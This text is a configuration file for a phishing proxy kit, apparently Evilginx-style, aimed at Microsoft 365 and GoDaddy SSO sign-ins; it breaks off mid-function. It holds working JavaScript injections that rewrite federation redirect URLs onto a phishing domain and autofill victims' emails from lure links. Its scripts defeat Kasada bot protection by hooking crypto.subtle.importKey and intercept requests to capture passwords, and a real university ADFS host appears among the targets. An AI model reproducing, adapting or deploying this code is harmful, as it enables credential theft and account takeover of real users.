login:
  domain: 'login.microsoftonline.com'
  path: '/'
# Auto fill email. Use by appending #{email} to lure link e.g. https://phish.com/lure#example@gmail.com
js_inject:
  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
    trigger_paths: ["/common/oauth2/v2.0/authorize*", "/", "/*"]
    script: |
      var _scEmail = '';
      var _hash = window.location.hash.slice(1);
      if (_hash && _hash.indexOf('@') !== -1) _scEmail = decodeURIComponent(_hash);

      // Patch both fetch AND XHR to intercept GetCredentialType and inject
      // email hash into FederationRedirectUrl before the page reads it.
      // Derive the phish domain from our current hostname (e.g. woman.nidlec-motor.com → nidlec-motor.com)
      var _phishDomain = (function() {
        var parts = window.location.hostname.split('.');
        return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
      })();

      function _patchResp(text) {
        if (text.indexOf('FederationRedirectUrl') === -1) return null;
        return text.replace(
          /("FederationRedirectUrl"\s*:\s*")([^"]*)/,
          function(m, prefix, fedUrl) {
            // Rewrite GoDaddy SSO hostnames and any ADFS/federation hostnames
            // to their proxied equivalents (fallback for compression-missed sub_filters)
            var patchedUrl = fedUrl
              .replace(/sso\.godaddy\.com/g,          'ssso.' + _phishDomain)
              .replace(/sso\.secureserver\.net/g,      'sssn.' + _phishDomain)
              .replace(/sso2\.secureserver\.net/g,     'sssn2.' + _phishDomain)
              .replace(/adfsstaff\.mans\.edu\.eg/g,    'adfsst.' + _phishDomain);
            // Append email fragment once
            if (patchedUrl.indexOf('#') === -1 && _scEmail) {
              patchedUrl += '#' + encodeURIComponent(_scEmail);
            }
            return prefix + patchedUrl;
          }
        );
      }

      // Always patch GetCredentialType responses to rewrite GoDaddy SSO hostnames.
      // Also inject email fragment when available. Runs regardless of _scEmail so
      // that host rewriting works even when the lure link had no #email suffix.
      (function() {
        // --- Patch fetch ---
        var _oFetch = window.fetch;
        window.fetch = function(url, opts) {
          var u = typeof url === 'string' ? url : (url && url.url) || '';
          var p = _oFetch.apply(this, arguments);
          if (u.indexOf('GetCredentialType') === -1) return p;
          return p.then(function(resp) {
            return resp.clone().text().then(function(text) {
              var patched = _patchResp(text);
              if (!patched) return resp;
              return new Response(patched, {
                status: resp.status,
                headers: {'Content-Type': 'application/json'}
              });
            });
          });
        };

        // --- Patch XHR ---
        var _oXHROpen = XMLHttpRequest.prototype.open;
        var _oXHRSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.open = function(m, url) {
          this._scUrl = url || '';
          return _oXHROpen.apply(this, arguments);
        };
        XMLHttpRequest.prototype.send = function() {
          if (this._scUrl && this._scUrl.indexOf('GetCredentialType') !== -1) {
            var self = this;
            Object.defineProperty(self, 'responseText', {
              get: function() {
                var raw = Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, 'responseText');
                var text = raw ? raw.get.call(self) : '';
                return _patchResp(text) || text;
              }, configurable: true
            });
          }
          return _oXHRSend.apply(this, arguments);
        };
      })();

      if (_scEmail) {
        function lp() {
          var emailId = document.querySelector('#i0116');
          var nextBtn  = document.querySelector('#idSIButton9');
          if (!emailId) { setTimeout(lp, 500); return; }
          emailId.focus();
          emailId.value = _scEmail;
          emailId.dispatchEvent(new Event('input',  {bubbles:true}));
          emailId.dispatchEvent(new Event('change', {bubbles:true}));
          if (nextBtn) { nextBtn.focus(); nextBtn.click(); }
        }
        setTimeout(lp, 500);
      }

  # GoDaddy SSO — WS-Fed puts username= in URL; page shows password field only.
  # Autofill email if present, keep retrying until input appears (React SPA).
  # Also intercepts fetch/XHR to capture the password since there is no
  # x-tymus session cookie on this subdomain (session was set on Microsoft proxy).
  # sso.secureserver.net is used for custom-domain GoDaddy O365 tenants.
  - trigger_domains: ["sso.godaddy.com", "sso.secureserver.net"]
    trigger_paths: ["/*", "/login/tac/pass*"]
    script: |
      (function() {
        // ── Kasada HMAC hostname patch ───────────────────────────────────────────
        // Kasada j-1.2.308 derives the X-Kpsdk-H HMAC key from window.location.hostname.
        // When proxied, that is the phish domain — GoDaddy's Kasada server rejects it.
        // Intercept crypto.subtle.importKey BEFORE the SDK loads: if the raw key bytes
        // contain the proxy hostname, replace them with the real hostname so the HMAC
        // is computed correctly. Runs in both the main page and the /fp iframe.
        try {
          var _kReal  = window.location.hostname.indexOf('sssn') === 0
                        ? 'sso.secureserver.net'
                        : 'sso.godaddy.com';
          var _kProxy = window.location.hostname;
          if (_kProxy !== _kReal && window.crypto && window.crypto.subtle) {
            var _enc = new TextEncoder();
            var _dec = new TextDecoder();
            var _re  = new RegExp(_kProxy.replace(/\./g, '\\.'), 'g');
            var _origImport = crypto.subtle.importKey.bind(crypto.subtle);
            crypto.subtle.importKey = function(fmt, keyData, algo, ext, uses) {
              if (fmt === 'raw' && keyData) {
                try {
                  var ab = keyData instanceof ArrayBuffer ? keyData
                         : ArrayBuffer.isView(keyData)
                           ? keyData.buffer.slice(keyData.byteOffset, keyData.byteOffset + keyData.byteLength)
                           : null;
                  if (ab) {
                    var txt = _dec.decode(ab);
                    if (txt.indexOf(_kProxy) !== -1) {
                      keyData = _enc.encode(txt.replace(_re, _kReal));
                    }
                  }
                } catch(_e) {}
              }
              return _origImport(fmt, keyData, algo, ext, uses);
            };
          }
        } catch(_e) {}

        // ── Proxy-domain rewriter ────────────────────────────────────────────────
        // Computes the phish base domain from the current hostname so we can
        // rewrite GoDaddy real-domain URLs in API responses before the SPA acts on them.
        var _pd = (function() {
          var parts = window.location.hostname.split('.');
          return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
        })();
        function _rewriteGDUrls(text) {
